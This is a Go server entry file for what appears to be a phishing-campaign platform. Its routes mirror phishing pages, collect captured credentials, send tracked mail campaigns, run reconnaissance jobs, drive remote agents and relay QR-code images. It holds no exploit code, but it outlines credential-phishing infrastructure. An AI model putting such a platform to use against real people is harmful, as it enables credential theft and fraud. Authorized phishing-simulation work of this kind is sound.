package main

import (
	"context"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"fishing-platform-backend/config"
	"fishing-platform-backend/handlers"
	"fishing-platform-backend/hostmetrics"
	"fishing-platform-backend/middleware"
	"fishing-platform-backend/models"
	"fishing-platform-backend/utils"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"golang.org/x/crypto/bcrypt"
)

//go:embed frontend/dist
var frontendFS embed.FS

//go:embed qqwry.dat
var qqwryData []byte

//go:embed scripts/qr-relay/qr_relay.py scripts/qr-relay/requirements.txt scripts/qr-relay/README.md scripts/qr-relay/config.example.yaml
var qrRelayScriptFS embed.FS

func main() {
	handlers.RegisterQrRelayScriptFS(qrRelayScriptFS)

	// Bootstrap runtime configuration.
	ginMode, err := config.BootstrapRuntimeConfig()
	if err != nil {
		log.Fatalf("Failed to bootstrap runtime configuration: %v", err)
	}
	utils.PrintAppBanner(utils.AppVersion, config.ServerPort(), ginMode)
	if !confirmInsecureSecuritySettings(config.InsecureSecuritySettings()) {
		log.Fatal("Startup aborted because insecure security configuration was not confirmed")
	}
	gin.SetMode(ginMode)

	checks := make([]utils.StartupCheck, 0, 10)

	// Initialize encryption
	encryptionKey := config.EncryptionKey()
	if err := utils.InitEncryption(encryptionKey); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "Encryption", OK: false, Detail: err.Error(),
		})
	} else {
		checks = append(checks, utils.StartupCheck{
			Name: "Encryption", OK: true, Detail: "ready",
		})
	}

	// Initialize embedded IP location database.
	if err := utils.InitIPLocationDB(qqwryData); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "IP geolocation", OK: false, Detail: err.Error(),
		})
	} else {
		checks = append(checks, utils.StartupCheck{
			Name: "IP geolocation", OK: true, Detail: "ready",
		})
	}

	// Initialize database
	dbPath := config.DatabasePath()
	if err := config.InitializeDatabase(dbPath); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "Database", OK: false, Detail: err.Error(),
		})
		utils.PrintStartupChecksPanel("Startup checks", checks)
		os.Exit(1)
	}
	if err := models.AutoMigrate(config.GetDB()); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "Database", OK: false, Detail: "migrate failed: " + err.Error(),
		})
		utils.PrintStartupChecksPanel("Startup checks", checks)
		os.Exit(1)
	}
	checks = append(checks, utils.StartupCheck{
		Name: "Database", OK: true, Detail: "connected",
	})

	if err := handlers.SyncEnabledIPBlacklistToHostFirewall(config.GetDB()); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "IP blacklist sync", OK: false, Detail: err.Error(),
		})
	}
	if _, err := handlers.EnsureMailTrackingSettingForBoot(); err != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "Mail tracking", OK: false, Detail: err.Error(),
		})
	}

	// Background host metrics sampling (30s interval, 24h retention).
	hostMetricsCtx, hostMetricsCancel := context.WithCancel(context.Background())
	defer hostMetricsCancel()
	hostmetrics.Start(hostMetricsCtx)

	// Initialize JWT
	middleware.InitJWT()
	if config.JWTSecret() == "" {
		checks = append(checks, utils.StartupCheck{
			Name: "JWT secret", OK: true, Detail: "generated in-memory for this process",
		})
	}

	checks = append(checks, ensureDefaultAdmin())
	checks = append(checks, probeDockerTCPPort("127.0.0.1:2375"))
	checks = append(checks, checkRequiredDockerImage())

	accessLogDir := utils.DefaultAccessLogDir(dbPath)
	accessLog, accessLogErr := utils.OpenAccessLog(accessLogDir)
	if accessLogErr != nil {
		checks = append(checks, utils.StartupCheck{
			Name: "Access log", OK: false, Detail: accessLogErr.Error(),
		})
	} else {
		defer accessLog.Close()
		checks = append(checks, utils.StartupCheck{
			Name: "Access log", OK: true,
			Detail: accessLog.Path() + " (daily rotate)",
		})
	}

	// Initialize Gin router (custom access log instead of gin.Default logger).
	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(utils.AccessLogMiddleware(accessLog))

	// Configure CORS
	corsConfig := cors.DefaultConfig()
	corsConfig.AllowAllOrigins = true
	corsConfig.AddAllowHeaders("Authorization", "Content-Type")
	r.Use(cors.New(corsConfig))
	// Avoid 301 trailing-slash redirects on API calls: browsers drop Authorization
	// on cross-origin redirects (e.g. Next dev on :8081 → API on :8000).
	r.RedirectTrailingSlash = false
	r.RedirectFixedPath = false

	platformBasicAuth := middleware.RequirePlatformBasicAuth()

	// Public routes
	public := r.Group("/api/auth")
	{
		both(public, http.MethodPost, "/register/", platformBasicAuth, handlers.Register)
		both(public, http.MethodPost, "/login/", platformBasicAuth, handlers.Login)
		both(public, http.MethodPost, "/logout/", platformBasicAuth, handlers.Logout)
		both(public, http.MethodPost, "/container_token/", handlers.GetContainerToken)
	}
	both(r, http.MethodPost, "/api/auth/token/refresh/", platformBasicAuth, func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"message": "Refresh endpoint"})
	})

	agentPublic := r.Group("/api/agents")
	{
		both(agentPublic, http.MethodPost, "/register/", handlers.RegisterAgent)
		both(agentPublic, http.MethodPost, "/heartbeat/", handlers.AgentHeartbeat)
	}

	// QR relay upload (token auth, image-only) + heartbeat + public image host.
	both(r, http.MethodPost, "/api/qr-relay/frames/", handlers.UploadQrRelayFrame)
	both(r, http.MethodPost, "/api/qr-relay/heartbeat/", handlers.HeartbeatQrRelay)
	r.GET("/q/:slug", handlers.ServeQrRelayImage)

	agentRuntime := r.Group("/api/agent")
	{
		both(agentRuntime, http.MethodGet, "/tasks/lease/", handlers.LeaseAgentTasks)
		both(agentRuntime, http.MethodPost, "/tasks/:taskID/start/", handlers.StartAgentTask)
		both(agentRuntime, http.MethodPost, "/tasks/:taskID/renew/", handlers.RenewAgentTask)
		both(agentRuntime, http.MethodPost, "/tasks/:taskID/complete/", handlers.CompleteAgentTask)
		both(agentRuntime, http.MethodGet, "/deployments/:id/artifact/", handlers.DownloadDeploymentArtifact)
		both(agentRuntime, http.MethodPost, "/deployments/:id/submit/", handlers.SubmitDeploymentData)
		both(agentRuntime, http.MethodPost, "/deployments/:id/logs/", handlers.UploadDeploymentLogs)
	}

	// Protected routes
	protected := r.Group("/api")
	protected.Use(middleware.AuthMiddleware(), middleware.AuditMiddleware())
	{
		both(protected, http.MethodGet, "/auth/me/", handlers.GetCurrentUser)

		auditLogs := protected.Group("/")
		auditLogs.Use(middleware.RequireAdmin())
		{
			both(auditLogs, http.MethodGet, "/audit-logs/", handlers.ListAuditLogs)
			both(auditLogs, http.MethodGet, "/audit-logs/actions/", handlers.ListAuditActions)
		}

		users := protected.Group("/users")
		users.Use(middleware.RequireAdmin())
		{
			both(users, http.MethodGet, "/", handlers.ListUsers)
			both(users, http.MethodPost, "/", handlers.CreateUser)
			both(users, http.MethodPut, "/:id/", handlers.UpdateUser)
			both(users, http.MethodPost, "/:id/reset-password/", handlers.ResetUserPassword)
			both(users, http.MethodDelete, "/:id/", handlers.DeleteUser)
		}

		aiSettings := protected.Group("/ai-settings")
		aiSettings.Use(middleware.RequireAdmin())
		{
			both(aiSettings, http.MethodGet, "/", handlers.GetAISettings)
			both(aiSettings, http.MethodPut, "/", handlers.UpdateAISettings)
			both(aiSettings, http.MethodPost, "/test/", handlers.TestAISettings)
		}

		mailTracking := protected.Group("/mail-tracking-settings")
		mailTracking.Use(middleware.RequireAdmin())
		{
			both(mailTracking, http.MethodGet, "/", handlers.GetMailTrackingSettings)
			both(mailTracking, http.MethodPut, "/", handlers.UpdateMailTrackingSettings)
		}

		both(protected, http.MethodGet, "/agents/", handlers.GetAgents)
		both(protected, http.MethodGet, "/agents/:id/", handlers.GetAgent)

		both(protected, http.MethodGet, "/robots/", handlers.GetRobots)
		both(protected, http.MethodGet, "/robots/:id/", handlers.GetRobot)
		both(protected, http.MethodPost, "/robots/", handlers.CreateRobot)
		both(protected, http.MethodPut, "/robots/:id/", handlers.UpdateRobot)
		both(protected, http.MethodPost, "/robots/:id/test/", handlers.TestRobot)
		both(protected, http.MethodGet, "/robots/:id/push_logs/", handlers.GetRobotPushLogs)
		both(protected, http.MethodPost, "/robots/:id/online/", handlers.StartRobot)
		both(protected, http.MethodPost, "/robots/:id/offline/", handlers.StopRobot)
		both(protected, http.MethodGet, "/robots/:id/messages/", handlers.GetRobotMessages)
		both(protected, http.MethodPost, "/robot_push_logs/", handlers.CreateRobotPushLog)

		both(protected, http.MethodGet, "/projects/", handlers.GetProjects)
		both(protected, http.MethodGet, "/projects/:id/", handlers.GetProject)
		both(protected, http.MethodPost, "/projects/", handlers.CreateProject)
		both(protected, http.MethodPut, "/projects/:id/", handlers.UpdateProject)
		both(protected, http.MethodPost, "/projects/:id/build/", handlers.BuildProject)
		both(protected, http.MethodGet, "/projects/:id/build_status/", handlers.BuildStatus)
		both(protected, http.MethodGet, "/projects/:id/deployments/", handlers.GetProjectDeployments)
		both(protected, http.MethodPost, "/projects/:id/deployments/:deploymentID/:action/", handlers.ControlProjectDeployment)
		both(protected, http.MethodGet, "/projects/:id/logs/", handlers.GetProjectLogs)
		both(protected, http.MethodPost, "/projects/:id/start_container/", handlers.StartContainer)
		both(protected, http.MethodPost, "/projects/:id/stop_container/", handlers.StopContainer)
		both(protected, http.MethodPost, "/projects/:id/restart_container/", handlers.RestartContainer)
		both(protected, http.MethodPost, "/projects/:id/start_local/", handlers.StartLocalFlask)
		both(protected, http.MethodPost, "/projects/:id/stop_local/", handlers.StopLocalFlask)
		both(protected, http.MethodPost, "/projects/:id/restart_local/", handlers.RestartLocalFlask)
		both(protected, http.MethodGet, "/projects/:id/container_log/", handlers.ContainerLog)
		both(protected, http.MethodGet, "/projects/:id/credentials/", handlers.GetProjectCredentials)

		both(protected, http.MethodGet, "/messages/", handlers.GetMessages)
		both(protected, http.MethodGet, "/messages/:id/", handlers.GetMessage)
		both(protected, http.MethodPost, "/messages/", handlers.CreateMessage)
		both(protected, http.MethodPut, "/messages/:id/", handlers.UpdateMessage)

		both(protected, http.MethodPost, "/credentials/", handlers.CreateCredential)
		both(protected, http.MethodPut, "/credentials/:id/", handlers.UpdateCredential)

		both(protected, http.MethodGet, "/ip-blacklist/", handlers.GetIPBlacklist)
		both(protected, http.MethodGet, "/ip-blacklist/:id/", handlers.GetIPBlacklistEntry)
		both(protected, http.MethodPost, "/ip-blacklist/", handlers.CreateIPBlacklistEntry)
		both(protected, http.MethodPut, "/ip-blacklist/:id/", handlers.UpdateIPBlacklistEntry)

		both(protected, http.MethodGet, "/smtp-services/", handlers.GetSmtpServices)
		both(protected, http.MethodGet, "/smtp-services/:id/", handlers.GetSmtpService)
		both(protected, http.MethodPost, "/smtp-services/", handlers.CreateSmtpService)
		both(protected, http.MethodPut, "/smtp-services/:id/", handlers.UpdateSmtpService)
		both(protected, http.MethodPost, "/smtp-services/:id/test/", handlers.TestSmtpService)
		both(protected, http.MethodPost, "/smtp-services/:id/send/", handlers.SendSmtpServiceMail)

		both(protected, http.MethodGet, "/mail-campaigns/", handlers.GetMailCampaigns)
		both(protected, http.MethodGet, "/mail-campaigns/:id/", handlers.GetMailCampaign)
		both(protected, http.MethodPost, "/mail-campaigns/", handlers.CreateMailCampaign)
		both(protected, http.MethodDelete, "/mail-campaigns/:id/", handlers.DeleteMailCampaign)
		both(protected, http.MethodGet, "/mail-campaigns/:id/recipients/", handlers.GetMailCampaignRecipients)
		both(protected, http.MethodGet, "/mail-campaigns/:id/events/", handlers.GetMailCampaignEvents)

		both(protected, http.MethodGet, "/info-gather-jobs/", handlers.GetInfoGatherJobs)
		both(protected, http.MethodPost, "/info-gather-jobs/", handlers.CreateInfoGatherJob)
		both(protected, http.MethodGet, "/info-gather-jobs/:id/", handlers.GetInfoGatherJob)
		both(protected, http.MethodGet, "/info-gather-jobs/:id/findings/", handlers.GetInfoGatherFindings)
		both(protected, http.MethodPost, "/info-gather-jobs/:id/retry/", handlers.RetryInfoGatherJob)
		both(protected, http.MethodDelete, "/info-gather-jobs/:id/", handlers.DeleteInfoGatherJob)

		both(protected, http.MethodGet, "/qr-relays/", handlers.GetQrRelays)
		both(protected, http.MethodPost, "/qr-relays/", handlers.CreateQrRelay)
		// Static path before :id
		both(protected, http.MethodGet, "/qr-relays/script.zip", handlers.DownloadQrRelayScript)
		both(protected, http.MethodGet, "/qr-relays/:id/", handlers.GetQrRelay)
		both(protected, http.MethodGet, "/qr-relays/:id/events/", handlers.StreamQrRelayEvents)
		both(protected, http.MethodGet, "/qr-relays/:id/frames/", handlers.ListQrRelayFrames)
		both(protected, http.MethodGet, "/qr-relays/:id/frames/:fid/", handlers.ServeQrRelayFrameImage)
		both(protected, http.MethodPost, "/qr-relays/:id/frames/:fid/promote/", handlers.PromoteQrRelayFrame)
		both(protected, http.MethodPost, "/qr-relays/:id/rotate-token/", handlers.RotateQrRelayToken)
		both(protected, http.MethodPost, "/qr-relays/:id/rotate-slug/", handlers.RotateQrRelaySlug)
		both(protected, http.MethodPost, "/qr-relays/:id/enabled/", handlers.SetQrRelayEnabled)
		both(protected, http.MethodDelete, "/qr-relays/:id/", handlers.DeleteQrRelay)

		both(protected, http.MethodGet, "/phishing-pages/", handlers.GetPhishingPages)
		both(protected, http.MethodPost, "/phishing-pages/mirror/", handlers.MirrorPhishingPage)
		both(protected, http.MethodPost, "/phishing-pages/rewrite-upload/", handlers.RewriteUploadPhishingPage)
		both(protected, http.MethodPost, "/phishing-pages/upsert/", handlers.UpsertPhishingPage)
		both(protected, http.MethodGet, "/phishing-pages/:id/", handlers.GetPhishingPage)
		both(protected, http.MethodPost, "/phishing-pages/", handlers.CreatePhishingPage)
		both(protected, http.MethodPut, "/phishing-pages/:id/", handlers.UpdatePhishingPage)
		both(protected, http.MethodDelete, "/phishing-pages/:id/", handlers.DeletePhishingPage)

		both(protected, http.MethodGet, "/dashboard/", handlers.GetStatistics)

		adminOnly := protected.Group("/")
		adminOnly.Use(middleware.RequireAdmin())
		{
			both(adminOnly, http.MethodDelete, "/robots/:id/", handlers.DeleteRobot)
			both(adminOnly, http.MethodDelete, "/projects/:id/", handlers.DeleteProject)
			both(adminOnly, http.MethodDelete, "/messages/:id/", handlers.DeleteMessage)
			both(adminOnly, http.MethodGet, "/credentials/", handlers.GetCredentials)
			both(adminOnly, http.MethodGet, "/credentials/:id/", handlers.GetCredential)
			both(adminOnly, http.MethodDelete, "/credentials/:id/", handlers.DeleteCredential)
			both(adminOnly, http.MethodDelete, "/ip-blacklist/:id/", handlers.DeleteIPBlacklistEntry)
			both(adminOnly, http.MethodDelete, "/smtp-services/:id/", handlers.DeleteSmtpService)
		}
	}

	// Mail tracking catch-all MUST be last among /api GET routes.
	r.GET("/api/:slug", handlers.DispatchMailTracking)

	// Serve static frontend files using StaticFS
	frontendDist, err := fs.Sub(frontendFS, "frontend/dist")
	if err != nil {
		log.Fatalf("Failed to create frontend filesystem: %v", err)
	}

	// Create a static file server
	httpFS := http.FS(frontendDist)
	fileServer := http.FileServer(httpFS)

	// Serve static files with a catch-all route and cache control
	r.Any("/assets/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/assets/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Next.js static export assets
	r.Any("/_next/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/_next/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	r.Any("/js/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/js/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	r.Any("/css/*filepath", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
		c.Request.URL.Path = "/css/" + c.Param("filepath")
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Serve favicon
	r.GET("/favicon.svg", platformBasicAuth, func(c *gin.Context) {
		c.Request.URL.Path = "/favicon.svg"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})
	r.GET("/favicon.ico", platformBasicAuth, func(c *gin.Context) {
		c.Request.URL.Path = "/favicon.ico"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Serve index.html for root path with aggressive cache control
	r.GET("/", platformBasicAuth, func(c *gin.Context) {
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		c.Header("Pragma", "no-cache")
		c.Header("Expires", "Thu, 01 Jan 1970 00:00:00 GMT")
		c.Request.URL.Path = "/"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Handle SPA routing - serve index.html for all other non-API routes with aggressive cache control
	r.NoRoute(func(c *gin.Context) {
		// Check if it's an API request
		if strings.HasPrefix(c.Request.URL.Path, "/api") {
			c.JSON(http.StatusNotFound, gin.H{"error": "API endpoint not found"})
			return
		}

		if !middleware.EnsurePlatformBasicAuth(c) {
			return
		}

		// Serve index.html for SPA routing with aggressive cache control
		c.Header("Cache-Control", "no-cache, no-store, must-revalidate, max-age=0")
		c.Header("Pragma", "no-cache")
		c.Header("Expires", "Thu, 01 Jan 1970 00:00:00 GMT")
		c.Request.URL.Path = "/"
		fileServer.ServeHTTP(c.Writer, c.Request)
	})

	// Start server
	port := fmt.Sprintf("%d", config.ServerPort())
	checks = append(checks, utils.StartupCheck{
		Name: "Listen", OK: true, Detail: ":" + port,
	})
	utils.PrintStartupChecksPanel("Startup checks", checks)

	if err := r.Run(":" + port); err != nil {
		utils.PrintStartupChecksPanel("Startup checks", []utils.StartupCheck{{
			Name: "Listen", OK: false, Detail: err.Error(),
		}})
		os.Exit(1)
	}
}

// both registers a route with and without a trailing slash.
// RedirectTrailingSlash is disabled to avoid cross-origin auth loss, so every
// API path must accept both forms (Next.js proxy may normalize slashes).
func both(r gin.IRoutes, method, path string, handlers ...gin.HandlerFunc) {
	if path == "/" || path == "" {
		r.Handle(method, "/", handlers...)
		r.Handle(method, "", handlers...)
		return
	}
	r.Handle(method, path, handlers...)
	if strings.HasSuffix(path, "/") {
		alt := strings.TrimSuffix(path, "/")
		if alt != "" {
			r.Handle(method, alt, handlers...)
		}
		return
	}
	r.Handle(method, path+"/", handlers...)
}

func confirmInsecureSecuritySettings(issues []config.InsecureSecuritySetting) bool {
	if len(issues) == 0 {
		return true
	}

	items := make([]utils.StartupIssue, 0, len(issues))
	for _, issue := range issues {
		items = append(items, utils.StartupIssue{
			Path:   issue.Path,
			Label:  issue.Label,
			Reason: issue.Reason,
		})
	}
	utils.PrintStartupWarningPanel(
		"Security configuration warning",
		"The following sensitive settings are still default or empty:",
		items,
		"Update these values in config.yaml with long random secrets before production use. Continuing with weak defaults may put tokens, credential encryption, and Flask callback auth at risk.",
	)

	if !utils.AskYesNo("Continue startup anyway? [y/N]: ") {
		utils.PrintStartupCancelled("Startup cancelled.")
		return false
	}
	return true
}

func probeDockerTCPPort(address string) utils.StartupCheck {
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return utils.StartupCheck{
			Name: "Docker endpoint", OK: false, Detail: address + " unreachable",
		}
	}
	_ = conn.Close()
	return utils.StartupCheck{
		Name: "Docker endpoint", OK: true, Detail: address + " reachable",
	}
}

func checkRequiredDockerImage() utils.StartupCheck {
	dockerClient, err := utils.NewDockerClient()
	if err != nil {
		return utils.StartupCheck{
			Name: "Docker image", OK: false, Detail: "cannot connect to Docker, skipped",
		}
	}
	defer dockerClient.Close()

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	exists, err := dockerClient.ImageExists(ctx, utils.RequiredProjectBaseImage)
	cancel()
	if err != nil {
		return utils.StartupCheck{
			Name: "Docker image", OK: false, Detail: err.Error(),
		}
	}
	if exists {
		return utils.StartupCheck{
			Name: "Docker image", OK: true, Detail: utils.RequiredProjectBaseImage + " present",
		}
	}

	utils.PrintStartupInfoPanel(
		"Docker base image missing",
		[]string{
			fmt.Sprintf("Required image: %s", utils.RequiredProjectBaseImage),
			fmt.Sprintf("Manual pull: docker pull %s", utils.RequiredProjectBaseImage),
			"Project Docker builds need this image on the host.",
		},
	)
	if !utils.AskYesNo("Download this image now? [y/N]: ") {
		return utils.StartupCheck{
			Name: "Docker image", OK: false, Detail: "missing; download skipped",
		}
	}

	pullCtx, pullCancel := context.WithTimeout(context.Background(), 30*time.Minute)
	defer pullCancel()
	if err := dockerClient.PullImage(pullCtx, utils.RequiredProjectBaseImage, os.Stdout); err != nil {
		return utils.StartupCheck{
			Name: "Docker image", OK: false, Detail: "pull failed: " + err.Error(),
		}
	}
	return utils.StartupCheck{
		Name: "Docker image", OK: true, Detail: utils.RequiredProjectBaseImage + " ready",
	}
}

// ensureDefaultAdmin creates a default admin user if missing and returns a startup check row.
func ensureDefaultAdmin() utils.StartupCheck {
	db := config.GetDB()

	var admin models.User
	if err := db.Where("username = ?", "admin").First(&admin).Error; err == nil {
		if models.NormalizeRole(admin.Role) != models.UserRoleAdmin {
			_ = db.Model(&admin).Update("role", models.UserRoleAdmin).Error
		}
		return utils.StartupCheck{Name: "Admin user", OK: true, Detail: "ready"}
	}

	password := utils.GenerateSecurePassword(12)
	hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return utils.StartupCheck{Name: "Admin user", OK: false, Detail: "hash failed: " + err.Error()}
	}

	admin = models.User{
		Username: "admin",
		Password: string(hashedPassword),
		Role:     models.UserRoleAdmin,
	}
	if err := db.Create(&admin).Error; err != nil {
		return utils.StartupCheck{Name: "Admin user", OK: false, Detail: "create failed: " + err.Error()}
	}

	dbPath := config.DatabasePath()
	dataDir := dbPath[:strings.LastIndex(dbPath, "/")]
	if dataDir == "" {
		dataDir = "."
	}
	passwordFile := dataDir + "/admin_password.txt"
	content := fmt.Sprintf("Fishing Platform Admin Credentials\n================================\nUsername: admin\nPassword: %s\nGenerated: %s\n\nIMPORTANT: Please save this password and delete this file after logging in.\n",
		password, time.Now().Format("2006-01-02 15:04:05"))

	if err := os.WriteFile(passwordFile, []byte(content), 0600); err != nil {
		return utils.StartupCheck{
			Name: "Admin user", OK: true,
			Detail: fmt.Sprintf("created; password=%s (file save failed)", password),
		}
	}
	return utils.StartupCheck{
		Name: "Admin user", OK: true,
		Detail: fmt.Sprintf("created; password saved to %s", passwordFile),
	}
}
